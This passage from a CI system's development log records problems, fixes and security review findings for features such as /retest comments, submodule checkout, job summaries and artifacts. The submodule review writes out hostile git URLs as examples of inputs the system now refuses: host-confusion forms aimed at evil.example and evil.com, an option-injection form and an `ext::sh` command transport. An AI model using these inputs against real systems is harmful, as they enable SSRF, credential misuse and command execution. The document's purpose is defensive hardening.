  ([argo-workflows#12864](https://github.com/argoproj/argo-workflows/issues/12864)).
- Teams build it themselves: an `issue_comment` workflow that finds the PR's failed runs and calls
  the rerun API ([estroz/rerun-actions](https://pkg.go.dev/github.com/estroz/rerun-actions),
  [pulsar-test-infra#28](https://github.com/apache/pulsar-test-infra/pull/28), which hit a GitHub
  search bug; [logto on DEV](https://dev.to/logto/automatically-rerun-your-github-workflow-after-failure-26hi)).
- The alternative, an empty commit or close-and-reopen, reruns everything
  ([GitHub docs](https://docs.github.com/en/enterprise-server@3.14/actions/how-tos/manage-workflow-runs/re-run-workflows-and-jobs)).

**Reproduction.** Before, Pit reran a commit only through the Checks API's "Re-run" button
(P28, which reruns only what failed thanks to the cache). In token mode Pit posts commit
statuses, which have no Re-run button, so the only rerun was a new push. Pit ignored
`issue_comment` events.

**Fix.** On `issue_comment` `created`, where the comment's first line is `/retest` (or
`/pit retest`) on a pull request:
- The commenter must be an owner, member or collaborator. Anyone else gets "needs a collaborator,
  not NONE", because a drive-by account must not be able to keep re-running a fork's code.
- Pit reruns the commit it last ran for that pull request, with the restrictions that commit ran
  under (`prior_run`), so a fork's labeled commit stays fresh and secretless. A fork's newer
  pushes still need the label.
- Passed tasks come back from the cache and failed ones run again: in effect "re-run failed
  jobs".
- Pit adds a 🚀 reaction to the comment.

Unlike Actions' rerun, which keeps a stale merge ref
([konadu](https://konadu.dev/github-actions-re-run-stale-merge-ref)), this reruns the PR head commit, which is
what Pit tested in the first place.

**Measured.** e2e `retest_comments_rerun_the_failures`, with signed webhooks and a mock GitHub:
- PR #9's run fails on `flake`;
- `/retest` from `NONE` is ignored;
- `/retest` from `MEMBER` starts a `retest` run of the same SHA: `steady` comes from the cache,
  `flake` runs and passes, and the run is green;
- the mock received exactly one reaction, on comment 2.

**Verdict: SOLVED** for reruns. Not done: `/test <task>` to run one task, and `ok-to-test`-style
approval for non-members (forks use the `pit:run` label instead).

## P54. Submodules: missing in the workspace, slow to clone, and painful to authenticate

**The pain.** `actions/checkout` needs `submodules: recursive`, and private submodules fail with
"Repository not found" because the job's token covers only its own repo. The fixes are a PAT or a
deploy key per submodule:
- [actions/checkout#116](https://github.com/actions/checkout/issues/116),
  [community #26936](https://github.com/orgs/community/discussions/26936),
  [#28672](https://github.com/orgs/community/discussions/28672),
  [codestudy](https://www.codestudy.net/blog/how-to-checkout-submodule-in-github-action/);
- SSH-URL submodules from GHES fail with "Host key verification failed"
  ([actions/checkout#934](https://github.com/actions/checkout/issues/934));
- builders hit the same wall
  ([docker/build-push-action#737](https://github.com/docker/build-push-action/issues/737));
- GitLab runners have their own versions ("transport 'file' not allowed",
  [gitlab-runner#38908](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/38908);
  [#28783](https://gitlab.com/gitlab-org/gitlab-runner/-/issues/28783));
- so does Gitea ([forum](https://forum.gitea.com/t/gitea-runner-recursive-checkout/10812)).

Each job clones every submodule again.

**Reproduction.** An app repo with `vendor/lib` as a submodule. The task reads
`vendor/lib/index.js`. Before:

```
check │ grep: vendor/lib/index.js: No such file or directory
✗ default.check: exited with 2
```

Pit's workspace never initialised submodules, so any repo using them failed outright. **NOT
SOLVED.**

**Fix.** After checkout, when `.gitmodules` exists, the worker handles each submodule:
- it reads the pinned commit from the gitlink (`ls-tree`);
- it resolves relative URLs against the superproject URL like git does (`../lib.git`, SSH
  `host:path` too);
- it fetches the commit into a per-URL mirror on the worker (`mirrors/sub-<hash>.git`, under a
  lock);
- it points the workspace's `submodule.<name>.url` at that mirror, runs `submodule update --init
  --force`, and cleans untracked files inside;
- it recurses, up to 3 levels.

So a submodule is fetched once per worker, warm workspaces keep their checkouts, and private ones
use whatever git credentials or SSH keys the worker has.

Safety:
- A `.gitmodules` URL is repository code. Fork PRs get no submodules (the group says so); a fork
  could otherwise point one at another repo's mirror on the worker, or fetch with the worker's
  credentials.
- A hosted repo's submodules must be on its own host or one in `PIT_SUBMODULE_HOSTS`. Paths on the
  worker are refused, using git's own rule for what counts as a path (`objects/../../x.git` is
  one). Only a local superproject may use paths.
- Only http(s), ssh, git, scp-style and path URLs are fetched. A URL git could read as an option
  (`-oProxyCommand=…`) or run as a command (`ext::sh -c …`) is refused, and so is any URL with `?`,
  `#`, `\`, `%` or brackets (unit-tested). *(The first version's path check missed git-local forms and allowed
  any host; see "Review of P51–P54".)*

**Measured.**
- The repro passes and prints the submodule's file.
- After the library's pointer moves to a new commit, the next run reads the new version
  (`42` → `43`).
- One `sub-…` mirror was created.
- e2e `submodules_are_checked_out_at_their_pinned_commit`: the task reads `one`, then `two` after
  the pointer bump.
- A unit test checks URL resolution (HTTPS, `./`, `../../` on a path, SSH, absolute) and local-path
  detection.
- Not tested: the fork and local-path refusals (code paths only).

**Verdict: PARTIAL.** Submodules work, fetched once per worker. Limits:
- Fork PRs get none.
- Task `inputs` see a submodule as one entry (its pinned commit), so a glob like `vendor/lib/**`
  doesn't match its files. The default (all files) does include the pointer, so keys change when
  it moves.
- `pit run` with an uncommitted submodule change isn't carried in the overlay.

## Review of P51–P54

GPT Sol couldn't run: the machine's Codex login is revoked. An independent Claude reviewer did
five rounds instead. Tests: `cargo test` 76 unit and 43 e2e, clippy clean.

Round 1:

1. **S1 (blocker): the "no worker paths for hosted repos" rule could be bypassed.** git treats
   any URL without `scheme://` or an scp `host:` as a path, so `objects/../../other.git` passed
   Pit's check. It reached other repos' mirrors on the worker, reproduced with git 2.43.
   `is_local_url` now follows git's rule.
2. **S2: any branch could make the worker fetch from any host with its credentials.** That meant
   SSRF, and tokens that cover more than this repo. A hosted repo's submodules must now be on its
   own host or in `PIT_SUBMODULE_HOSTS`.
3. **S3: `/retest` could pick a merge queue candidate run** (tagged with the PR) instead of the
   PR's own commit. It now selects `ref = pull/<n>` only. Unit test added.
4. **S4: a last attempt that wrote no JUnit report** marked every earlier failure "passed on a
   retry". Now nothing counts as passed on a retry without a final report.
5. **Nits, all fixed:**
   - tasks that exit 0 with JUnit failures no longer count as "same inputs";
   - outcomes are always posted, so a requeued attempt's rows are replaced;
   - the fork submodule note no longer hides the LFS note;
   - a comment overstated who may `/retest` (read-only collaborators can);
   - a doc comment had moved onto the wrong function.

Rounds 2 to 5:

6. **S10 (blocker): the host check itself could be fooled.** For
   `https://evil.example#@github.com/x` (and the `?` form), Pit read the host as `github.com`
   while git fetched from `evil.example`, tested against a local listener. URLs with `?`, `#`,
   `\`, whitespace or control characters are now refused.
7. **S11:** IPv6 literal hosts were truncated to `[`, so any two matched.
8. **S12 (blocker): the host check could still be fooled.** For `ssh://` and `git://`, git decodes
   `%2f` and strips `[…]` before choosing the host. Six URLs reached another host against real git
   and a fake ssh, among them `ssh://evil%2f@github.com/x`, `git://[127.0.0.1]@github.com/x` and
   `[evil]@github.com:x`. URLs with `%` or brackets are now refused, which fails closed: no
   IPv6-literal submodule hosts. All six are rejected in unit tests.
9. **S13 (high): a `:` mid-host.** git keeps `github.com:1.evil.com` whole as a host name,
   resolved in evil.com's DNS zone. With a fake DNS server, Alpine/musl git connected to the
   attacker; glibc happened to drop the answer. Pit read the host as `github.com`. Hosts must now
   be strict `[A-Za-z0-9.-]`, with an optional 1–5 digit port, or the URL is refused.

Checked and fine:
- `.gitmodules` `update = !command` can't run (`--checkout` overrides it, and git refuses it from
  `.gitmodules`);
- `/retest` never runs a fork's unapproved commit;
- test outcomes need the live lease;
- the DST logic is correct.

Claims corrected: P54's local-path and safety lines, P53's "the commit it last ran", P51's
retried-test rule.

## P55. Bot commits and bot pull requests never get CI (`GITHUB_TOKEN`)

**The pain.** Events made with Actions' `GITHUB_TOKEN` don't start workflows, by design, to stop
recursion:
- an auto-formatter's commit, a release bot's PR or a changelog commit get no checks;
- required checks then sit at "Expected — Waiting for status to be reported" forever.

Sources: [community #25702](https://github.com/orgs/community/discussions/25702),
[#37103](https://github.com/orgs/community/discussions/37103),
[#65321](https://github.com/orgs/community/discussions/65321),
[#27028](https://github.com/orgs/community/discussions/27028);
[awslabs/automated-security-helper#341](https://github.com/awslabs/automated-security-helper/issues/341);
[DEV, "0 of 11 releases"](https://dev.to/ji_ai/github-actions-githubtoken-wont-trigger-workflows-0-of-11-releases-42em).

The workarounds:
- a GitHub App token or a PAT for the bot (a secret to manage, and a loop guard to add);
- `workflow_dispatch` calls;
- deploy keys ([action-push-to-protected](https://github.com/powderlabs/action-push-to-protected));
- a human pushing an empty commit.

**Reproduction.** The sources describe the rule as one about *workflow runs*: it stops Actions
from starting workflows, and none of them say webhooks to apps are held back. I did not verify
that against GitHub. Pit's side is what can be shown here: it starts runs from webhooks without
looking at the sender, but nothing tested that. e2e `bot_pushes_and_pull_requests_are_tested` sends two signed webhooks for one commit:
- a `push` to `format` by `github-actions[bot]` (`sender.type: Bot`);
- a `pull_request` opened by `dependabot[bot]`.

Each starts a run of that commit, and both pass.

**Verdict: PARTIAL** (Pit's half proven). Given the webhooks, bot commits and bot PRs get Pit
checks with no PAT, App token or dispatch step. No loop guard is needed: the only commits Pit itself pushes are merge-queue landings, which
it tests as post-merge runs, and their push event's identical tasks come from the cache (P39). A
trusted post-merge run and that push run count as the same kinds (`push`, `main`), so `on` doesn't
split them.
Not shown here: the GitHub side (real webhook delivery for a `GITHUB_TOKEN` push), which these
sources describe but this machine can't produce.

## P56. "Run this only in the merge queue / only on main" (and required checks that wait forever)

**The pain.** Expensive suites (e2e, deploy previews, release steps) should run only in the merge
queue or on main, not on every PR push. In Actions that takes an `if:` on the job, plus triggering
the workflow on `merge_group` and `pull_request` both. The traps:
- **A whole workflow filtered out never reports**, so its required check waits forever.
- **A job skipped by `if:` reports success.** That's handy, but `github.ref == 'refs/heads/main'`
  doesn't match in the queue (`gh-readonly-queue/…`), so e2e silently "passes" there having run
  nothing ([ethpayserver#281](https://github.com/randomcash/ethpayserver/pull/281)).
- **Teams build gatherer jobs** that read `toJSON(needs)` to decide
  ([boinkor.net](https://boinkor.net/2023/11/neat-github-actions-patterns-for-github-merge-queues/),
  [cubic](https://www.cubic.dev/blog/github-merge-queue),
  [community #51120](https://github.com/orgs/community/discussions/51120),
  [#171941](https://github.com/orgs/community/discussions/171941),
  [lemma-platform#942](https://github.com/lemma-work/lemma-platform/pull/942),
  [tester-army/e2e#931](https://github.com/tester-army/e2e/pull/931),
  [GitHub docs](https://docs.github.com/en/pull-requests/how-tos/merge-and-close-pull-requests/troubleshooting-required-status-checks)).

**Reproduction.** Pit had no conditions. The config function's context held only `packages`, with
no trigger or branch, so every group ran in every kind of run. An e2e group ran on every PR push,
and a deploy group would have deployed from PRs.

**Fix: `on` on a group.**
- The kinds are `pr`, `push`, `main` (trusted default-branch pushes and post-merge), `queue`,
  `schedule` and `local` (`pit run`, MCP, and any run created through the API, whatever trigger it
  names).
- A run's kind comes from its trigger, trust and ref. A rerun or `/retest` counts as the run it
  repeats (the check's own run, from its `external_id`). A queue candidate is `queue` whatever its
  ref looks like, so the "skips silently in the queue" trap can't happen.
- A left-out group is still recorded, passed with skipped tasks and a message ("runs only in queue,
  main runs (`on`)"). Its check reports `skipped` as a check run, which GitHub counts as passing
  for a required check, and `success` as a commit status. A required `pit / e2e` never waits.
- If another run of the same commit really runs a group, the left-out copy posts nothing. A
  branch-push run and a PR run of one commit can't overwrite each other's check.
- Tasks named on a local run (`pit run e2e.test`) or in a schedule run regardless.
- Unknown kinds are config errors.

**Measured.**
- e2e `groups_run_only_on_the_kinds_of_run_they_name`, with groups `unit`, `e2e` (`on: queue,
  main`) and `deploy` (`on: main`):
  - a local run executes only `unit`; `e2e` and `deploy` are recorded passed with skipped tasks;
  - `pit run e2e.test` runs e2e;
  - a trusted push to main runs all three;
  - `on: ["pull_request"]` is rejected.
- e2e `groups_left_out_by_on_still_report_their_check`: a PR run against a mock GitHub posts
  `pit / deploy` as `success`. Its task, `exit 1`, never ran.
- e2e `a_real_check_is_reposted_over_a_newer_left_out_one` (App auth): the left-out copy is posted
  as `skipped` and the real one as `failure`.
- A unit test covers the trigger-to-kind mapping, reruns and `/retest` included.

**Review fixes** (an independent review found 2 blockers and 5 shoulds, all fixed):
- left-out copies overwrote real checks;
- reruns counted as branch pushes and went green;
- schedules naming a left-out task passed having run nothing;
- untrusted post-merge counted as `main`;
- left-out groups were identified by worker name (now a column);
- API clients could pick a trigger to reach `main`-only groups;
- left-out sharded groups could fail planning.

The e2e tests cover the first, second, third and sixth, and the overwrite test fails without its
fix.

A second round found that GitHub takes the *newest* check run of a name as the check, so in App
mode a left-out copy that raced in after the real check run could still hide it. Now:
- a real group posts a new check run whenever a left-out copy's is newer;
- a left-out copy that finds a real group appeared while it posted re-reports that run.

The App-mode e2e plants the race and sees a fresh `failure` check run; without the fix Pit
patches the hidden one. Also fixed in round 2:
- local runs with uncommitted changes no longer count as "the real run" (they are never
  reported);
- the migration checks each new column separately;
- "Re-run all checks" counts as every kind the commit ran as, so no PR-only check gets left
  out.

**Verdict: SOLVED.** Limits:
- `on` is read from the commit being run, so a PR can edit its own `on` and leave a required group
  out of its merge queue candidate. That's no new power: it could already change the group's
  command to `true`. But a removed group used to fail closed (its check never reported), while a
  left-out one reports `skipped`. Protect the config with CODEOWNERS.
- `on` is per group, not per task.
- There's no branch-name filter beyond `main` (the default branch); the config function still
  can't see the branch.

## P57. Job summaries: tools write `$GITHUB_STEP_SUMMARY`, and self-hosted CI shows nothing

**The pain.** Job summaries are how CI output gets read without opening logs: coverage tables,
test counts, links. A whole ecosystem writes them:
- [test-summary-action](https://github.com/marketplace/actions/test-summary-action),
  [code-coverage-summary-action](https://github.com/marketplace/actions/code-coverage-summary-action),
  [Clover coverage summary](https://github.com/marketplace/actions/clover-code-coverage-summary),
  [markdown coverage report](https://github.com/marketplace/actions/markdown-coverage-report),
  [Vitest coverage reporter](https://github.com/marketplace/actions/hyperse-vitest-coverage-reporter);
- [josh-ops](https://josh-ops.com/posts/github-code-coverage/) and
  [OneUptime](https://oneuptime.com/blog/post/2026-01-30-github-actions-step-summary/view) show
  the pattern;
- projects add `GITHUB_STEP_SUMMARY` output to their own scripts
  ([Riftcaster#81](https://github.com/JasonDiBabbo/Riftcaster/issues/81),
  [Eventuous#613](https://github.com/Eventuous/eventuous/issues/613)).

Moving off Actions loses all of it.

**Reproduction.** A task appending a coverage table with `>> $GITHUB_STEP_SUMMARY`. Before, the
variable was unset in Pit tasks, so the redirect targets an empty name: `sh` says `cannot create :
Directory nonexistent` and exits 2, failing the task. Nothing reached the check or the CLI.

**Fix.**
- **Every task gets a summary file.** `$PIT_SUMMARY` and the same path as `$GITHUB_STEP_SUMMARY`
  point at a file named by the task's id, in a directory of the worker's own outside the workspace:
  an absolute path on the host, mounted at `/pit-summary/…` in containers. So a task that `cd`s
  elsewhere still finds it, and the checkout stays clean.
- **It's emptied before each attempt**, so the last attempt's summary counts.
- **The worker reads it after the task**, without following symlinks, regular files only, up to
  64 KiB (more is left out with a log line), masked like logs. It always posts it, even empty, so
  a requeued attempt's summary is replaced (`POST /api/tasks/{id}/summary`, lease-checked).
- **It's shown in three places:**
  - the group's GitHub check, under `### <task>` after the task table, within the check summary's
    size limit (beyond it, a note per task points at `GET /api/runs/<id>`). A fork's markdown is
    fenced, so it can't pose as Pit's text or swallow what follows;
  - the end of `pit run`;
  - the API (`TaskView.summary`).

**Measured.**
- A host task writing a coverage table through `$GITHUB_STEP_SUMMARY`, and a `node:22-alpine`
  task writing `**node** v22.23.3` through `$PIT_SUMMARY` after `cd /tmp`: both printed under
  `summary default.<task>` at the end of `pit run`.
- e2e `failed_tests_are_annotated_on_the_check`: the failing task also writes a summary, and the
  check's summary sent to the mock GitHub contains `### test` followed by it.
- A unit test checks the summary's placement and that a 70 KB summary is left out with a note,
  keeping the check under 65,535 characters.

**Review fixes.** The first version kept the file at `.pit/summary/<task>.md` in the workspace,
and an independent review found:
- a fork container could symlink `.pit` or `.pit/summary` and make the worker read a host file
  onto the public check, or empty one on a retry;
- every checkout gained an untracked `.pit/`, failing "clean tree" checks;
- sanitised names collided;
- a requeue could keep a stale summary;
- the "see the run" note pointed at a page that doesn't show it.

All are fixed as described above. e2e `summaries_live_outside_the_workspace` checks the path is
outside the workspace and `git status` stays clean, and, with Docker, that a `node:22-alpine` task
writes through the `/pit-summary` mount. A unit test checks the fork fence. JUnit reports are again
skipped unless valid UTF-8.

A second review round fixed:
- notes for oversized summaries could push the check past GitHub's limit, so the summary is now
  hard-capped;
- a fork task name with newlines escaped the fence, so names are now flattened and quoted in
  headings and the table;
- `pit run --debug` lost `$PIT_SUMMARY`, so the directory now lives as long as the debug hold;
- crash leftovers are removed at worker start;
- a requeued group's tasks start with no summary.

Not done: the summary file is recreated with a plain write, which a parallel sibling container
could in theory race. Fork tasks run one at a time, so it isn't a trust boundary.

**Verdict: SOLVED.** Limits:
- One summary per task, not per step.
- A cache hit shows no summary (the task didn't run).
- With a plain token (commit statuses), there's no summary on GitHub.
- No dashboard rendering yet: the API carries the summary.

## P58. Concurrency queues cancel waiting deploys (and Pit's lock ran them out of order)

**The pain.** In GitHub Actions a concurrency group holds one pending run: a newer one *cancels*
the one waiting, even with `cancel-in-progress: false`.

> there can be only one pending job … the previous pending jobs will still be cancelled. Wish
> this was indicated somewhere as it took me forever to debug this.

[community #32376](https://github.com/orgs/community/discussions/32376); also
[#63136](https://github.com/orgs/community/discussions/63136) ("I never want to cancel a pending
job in this group. Just line them up"), [#69704](https://github.com/orgs/community/discussions/69704).

Deploys of intermediate commits vanish, and serial tests against a shared resource are skipped.
GitHub added `queue: max` (up to 100 pending) in May 2026
([docs](https://docs.github.com/en/enterprise-cloud@latest/actions/how-tos/write-workflows/choose-when-workflows-run/control-workflow-concurrency),
[laplusda](https://laplusda.com/en/posts/github-actions-concurrency-pending-cancelled/),
[ittrip](https://en.ittrip.xyz/windows/troubleshooting/github-actions-concurrency),
[starsling](https://starsling.dev/best-practices/github-actions/cut-queue-time)); older guides
still describe one-pending ([RunsOn](https://runs-on.com/github-actions/concurrency/)).

**Reproduction.** Pit's `lock` (P29) never cancels: waiting groups stay queued without a limit. The
new e2e `every_deploy_runs_in_order_under_a_lock` makes four quick pushes to a default branch named
`develop`, each deploying under `lock: "prod"`. Two problems turned up:
1. **Superseding cancelled the deploys.** The supersede rule (P9) exempted only branches named
   `main`, `master` or `trunk`, so the first three `develop` runs were cancelled ("superseded by
   run_…"), on the old code, measured.
2. **The lock wasn't first come, first served.** With superseding fixed, the four deploys all ran,
   one at a time, but not always in push order: the first two swapped in 2 of 3 runs. Production
   would briefly get the older commit last. Groups were claimed in the order they were *planned*,
   and runs plan concurrently.

**Fix.**
- Trusted runs (pushes to the default branch, whatever its name) never supersede each other.
- A locked group can't be claimed before:
  - an older run's group waiting for the same lock, or
  - an older run of the same repo that is still being planned (capped at a minute).

**Measured.** The e2e passed 5 of 5 after the fix (1 of 3 before), with `start/end` lines strictly
in push order and no run cancelled. The old supersede rule fails the same test (checked by putting
it back). The P29 lock tests and the rest of the suite pass, twice.

**Review fixes.** An independent review of this found no deadlock, but four real gaps, all fixed:
1. **The "still planning" rule ended as soon as an older run inserted its first group**, so its
   later locked group could still be overtaken. Runs now record `planned_at` once all their groups
   exist, and the e2e config has two groups planned before the deploy.
2. **An older locked group no online worker could run blocked everyone behind it.** It's now
   skipped.
3. **Priority inversion: a merge-queue or trusted group waited behind older PR runs on a shared
   lock.** Only older runs of the same or a higher claim priority count.
4. **The new subqueries scanned a repo's whole run history on every claim.** Indexes added.

Ties within a millisecond are broken by row order.

**Verdict: SOLVED.** Pit had "no limit, no cancellations" but not ordering, and default branches
not named main were superseded. Both are fixed. Limit: while a locked group waits behind an older
one, its waiting message doesn't name that run.

## P59. Container jobs re-download every dependency on every run

**The pain.** Inside a container job, `$HOME` is a temp folder the runner cleans between jobs, so
`~/.npm`, `~/.cache/pip` and `~/.cargo` start empty each time. `actions/cache` on self-hosted
runners still round-trips through GitHub, and job images are pulled before any cache step could
run.

Sources: [community #18549](https://github.com/orgs/community/discussions/18549),
[#47550](https://github.com/orgs/community/discussions/47550),
[froghat](https://froghat.ca/2023/03/github-runner-cache/) (bind-mount something that outlives the
tmpfs), [OneUptime](https://oneuptime.com/blog/post/2025-12-20-self-hosted-runners-github-actions/view)
(`npm config set cache /opt/cache/npm`), [local-cache action](https://github.com/marketplace/actions/local-cache-on-self-hosted-runner),
[tenki](https://tenki.cloud/blog/github-actions-cache-strategy),
[matthewswong](https://www.matthewswong.com/en/blog/github-actions-runners/),
[Medium](https://medium.com/@rohitverma27305/zero-billing-github-actions-with-self-hosted-runners-f9a1e9418d18),
[quickstarkdemo/github-runner](https://github.com/quickstarkdemo/github-runner).

**Reproduction.** A `node:22-alpine` task runs `npm install lodash express` into `/tmp/app`, so
nothing lands in the warm workspace, and reports whether `~/.npm` had a cache. Before, Pit's
containers got `HOME=/tmp` in a container removed after the task:

| | run 1 | run 2 | run 3 |
| --- | --- | --- | --- |
| before | cold, 5.7s | cold, 6.2s | cold, 8.0s |
| after | cold, 6.0s | warm, 3.3s | warm, 4.5s |
| after, `--fresh` | cold, 6.9s | | |

**Fix.**
- A container's `$HOME` is now `/pit-home`, bind-mounted from a worker directory
  (`homes/<repo>-<hash>/<pool>-<group>`), so tool caches persist.
- It's split by repo, trust pool and group, like warm workspaces (P20), so neither another repo
  nor a branch can leave a poisoned npm cache for main, and a credential one group's tool writes
  to `$HOME` (`~/.npmrc`, `docker login`) isn't readable from another group. (The first commit
  shared homes across repos, and a review found them shared across groups; both fixed.)
- Fork runs and `--fresh` (and `pit verify`) get the old empty `/tmp`.

The rest of the time is npm resolving metadata over the network; `--prefer-offline` would cut more.

**Measured.**
- The table above: three runs plus a `--fresh` one, on the same commit.
- e2e `container_homes_persist_per_trust_pool` (Linux with Docker):
  - a marker in `$HOME` is missing on the first run and found on the second;
  - a `--fresh` run doesn't see it;
  - a trusted run of main starts with its own empty home.

**Cleanup** (added in the next commit). The workspace GC now covers homes too:
- a home unused for 14 days is removed;
- past `--workspace-max-gb` (what the workspaces leave of it), the least recently used homes go
  first, but never one used in the last day, since a running job may have it mounted;
- each home is touched when a job uses it.

A unit test checks that homes are found, sized, aged, and kept while recent.

The review also made removal safe against a job starting on a home: the GC re-checks the home's
last use under a lock that job setup also takes, then moves it to trash. Homes are mounted with
`--mount`, which fails rather than letting Docker create a root-owned directory. Only Docker tasks
create homes.

**Verdict: PARTIAL.** Container tool caches now persist per worker, repo and trust pool, and are
cleaned up. Limits:
- They're per worker, not shared across workers.
- State in `$HOME` can leak between runs of the same pool, as warm workspaces can. `pit verify`
  is the check.

## P60. GitHub's secondary rate limits: CI bots blocked from posting statuses

**The pain.** GitHub limits content creation to about 80 requests a minute and 500 an hour, apart
from the primary quota
([REST rate limits](https://docs.github.com/en/rest/using-the-rest-api/rate-limits-for-the-rest-api),
[troubleshooting](https://docs.github.com/en/rest/using-the-rest-api/troubleshooting-the-rest-api)).
Past that, writes fail with "You have exceeded a secondary rate limit and have been temporarily
blocked from content creation", even with thousands of primary requests left
([community #32120](https://github.com/orgs/community/discussions/32120),
[#60208](https://github.com/orgs/community/discussions/60208)).

Tools keep adding the retry they lacked:
- [gca#12](https://github.com/jacksonwade/gca/pull/12) and
  [BuildIT#136](https://github.com/tanmayiift/BuildIT/pull/136): wait out `Retry-After`, or 60s
  when GitHub only says so in the message;
- [Dev Proxy](https://learn.microsoft.com/en-us/microsoft-cloud/dev/dev-proxy/how-to/test-github-api-rate-limit-handling),
  [lunar.dev](https://www.lunar.dev/post/a-developers-guide-managing-rate-limits-for-the-github-api),
  [fast.io](https://fast.io/resources/github-api-rate-limiting-strategies/).

A CI system posting checks is exactly such a writer.

**Reproduction.** e2e `github_reporting_posts_each_change_once`: a PR run of 20 groups against a
mock GitHub (token mode) that counts `POST /statuses`. Before, Pit re-posted every group's status
on every claim and every group finish: **820 calls** for one run, about 2N² + 2N. That is past the
hourly limit in a single run. A refused call also aborted the rest of that report, and nothing
tried again: a final "passed" could be lost and the check left "pending".

**Fix.**
- **Each group's check is posted only when what GitHub would show changes.** For a commit status
  that's its state and description; for a check run, its whole output. The last state posted is
  remembered per group, and one report of a run runs at a time, so concurrent claims can't both
  post the same thing.
- **P56's reposts still happen.** A left-out copy's post (counted per commit and group) and a
  newer left-out check run (App auth) change the real group's key, so it posts again.
- **Rate limits are retried.** A 403 or 429 carrying `Retry-After`, or saying "rate limit", now
  schedules the run's report again in the background after that wait (60s without one, at most
  5 minutes), once per run, with the latest state. Nothing waits in the request that triggered
  it.

**Measured.**
- The same 20-group run now posts **60–62** statuses (three runs: 62, 61, 60), about 3 per group:
  queued, running, done.
- e2e `rate_limited_reports_are_retried`: the mock refuses the first 8 posts with 403 and
  `Retry-After: 1`. All three groups still end at their final status (`success`, `success`,
  `failure`). With the retry disabled, all three final statuses were lost.
- The P56 race tests still pass.

**Review fixes.**
- A rate-limited repost of *another* run (P56's race path) is now retried for that run, not the
  reporting one. Previously the repost was simply lost.
- Retries are jittered.
- Installation-token requests that are rate limited count as rate limits too.
- A failed annotation chunk releases the claim, so the rest are sent later.
- The left-out counter map is bounded.

**Verdict: SOLVED** for Pit's own reporting. Limits:
- The memory of what was posted is in-process: after a server restart, the first report of a run
  posts every group once more. A retry pending at the restart is lost; the run's next event
  reports again, but a run that has already finished gets none.
- There's no global request budget across runs, so many large runs at once can still meet the
  limit. They then wait and retry rather than lose checks.

## P61. Artifacts: zips of zips, and nothing kept from the run that failed

**The pain.** Getting files out of CI (a Playwright report from a failed e2e, a build to try) has
meant `upload-artifact`, and for years only zips: a single file downloads as a `.zip`, an
uploaded zip as `.zip.zip`
([community #26223](https://github.com/orgs/community/discussions/26223),
[#38706](https://github.com/orgs/community/discussions/38706),
[upload-artifact#39](https://github.com/actions/upload-artifact/issues/39)). On that last issue,
upload-artifact's own zipping took 2m36s against 12s for 7zip.

Corruption and lost files are reported too:
[upload-artifact#74](https://github.com/actions/upload-artifact/issues/74),
[#575](https://github.com/actions/upload-artifact/issues/575),
[act#2371](https://github.com/nektos/act/issues/2371).

v4 rebuilt the backend
([GitHub blog](https://github.blog/news-insights/product-news/get-started-with-v4-of-github-actions-artifacts/)).
In February 2026, unzipped artifacts arrived for single files only, behind `archive: false` with
upload v7 and download v8
([changelog](https://github.blog/changelog/2026-02-26-github-actions-now-supports-uploading-and-downloading-non-zipped-artifacts/),
[zenn](https://zenn.dev/korosuke613/articles/github-actions-use-archive-artifact?locale=en),
[docs](https://docs.github.com/en/actions/tutorials/store-and-share-data)).

**Reproduction.** Pit had no artifacts at all. A task's `outputs` went into the cache only when it
*passed*, and nothing could download them. A failing e2e's `playwright-report/` stayed in the
worker's workspace, where the next run overwrote it.

**Fix: `artifacts` on a task** (globs).
- **Only what the task wrote.** Before the task, the matches are recorded (size and mtime); only
  files new or changed afterwards are kept. A warm workspace's leftovers from an earlier run are
  skipped, and so are committed files the glob also matches.
- **Kept from every run.** After the task, passed or failed, the matches are collected (regular
  files, not through symlinks, at most 100 MiB a file and 512 MiB a task; anything left out is
  noted in the log), stored in the CAS and recorded on the task (`POST /api/tasks/{id}/artifacts`,
  lease-checked, only digests the CAS has).
- **Downloadable two ways:**
  - each file as itself, no zip, `Content-Disposition: attachment`, at
    `GET /api/tasks/<id>/artifacts/<path>`;
  - all of them with `pit artifacts <run> [--task t] [--out dir]`, into
    `<out>/<group>/<task>/<path>`.
- **Kept up to 14 days.** The CAS GC keeps artifact blobs for the same 14 days it keeps a run's
  logs, within a quarter of the cache budget, newest runs first, so artifacts never push the build
  cache out.
- **Cleared on a new claim**, so a requeued attempt's artifacts aren't shown.

**Measured.**
- A failing task writes `playwright-report/index.html` and a 20,000-byte `checkout-failed.png`.
  Both are recorded. The API returns the PNG with `content-disposition: attachment;
  filename="checkout-failed.png"`, byte-identical to the copy `pit artifacts` wrote.
- e2e `artifacts_are_kept_from_failed_runs_and_served_as_files`:
  - a failing run keeps both of its files, and one is served as itself;
  - `pit artifacts` writes it under `default/e2e/`;
  - the next run, which writes only `fail.png`, does not keep the previous run's `stale.txt`.
- A unit test: the GC keeps artifact blobs.

**Review fixes.** An independent review found two blockers and several shoulds in the first
version, all fixed:
1. **`pit artifacts` could write anywhere.** Group and task names were joined onto `--out`
   unchecked, so a fork's config naming a group `/home/u/sub` and a task `..` could make a
   maintainer's download overwrite `~/.bashrc`. Now the whole `<group>/<task>/<path>` goes through
   `safe_join`, and config loading rejects names with `.`/`..` parts, a leading `/`, `\` or
   control characters. Scoped names like `typecheck:@acme/web` are still fine.
2. **Clearing the globs before each attempt deleted whatever they matched**: committed Playwright
   baselines for `**/*.png`, a dependency's `dist/`. Nothing is deleted now. The e2e test commits
   a `baseline.png` the task reads under `**/*.png`: the task passes, and only the new `diff.png`
   is kept.
3. **Should-fixes:**
   - artifacts are best-effort (a failure is logged, never fails the task);
   - they no longer fill the worker's local CAS;
   - they have their own GC budget;
   - sizes are checked before reading, and files are uploaded one at a time;
   - the CLI skips a bad file and carries on;
   - the worker applies the 1000-file cap and says why files were left out;
   - globs are validated at config load;
   - downloads get a UTF-8 `filename*` and `nosniff`.

**Verdict: SOLVED.** Limits:
- Each file is read whole into memory to upload (hence the caps).
- A file changed back to its old size and mtime looks unchanged.
- Artifacts are not restored on a cache hit; that's what `outputs` is for.
- No dashboard links yet.

## P62. Cancel that doesn't cancel

**The pain.** On GitHub Actions, "Cancel workflow" often doesn't stop anything. Runs sit in
`queued` with no runner, and both cancel and force-cancel fail
([community #196717](https://github.com/orgs/community/discussions/196717),
[#205874](https://github.com/orgs/community/discussions/205874),
[#205628](https://github.com/orgs/community/discussions/205628) (HTTP 500 on both),
[#205893](https://github.com/orgs/community/discussions/205893) (queued with zero jobs),
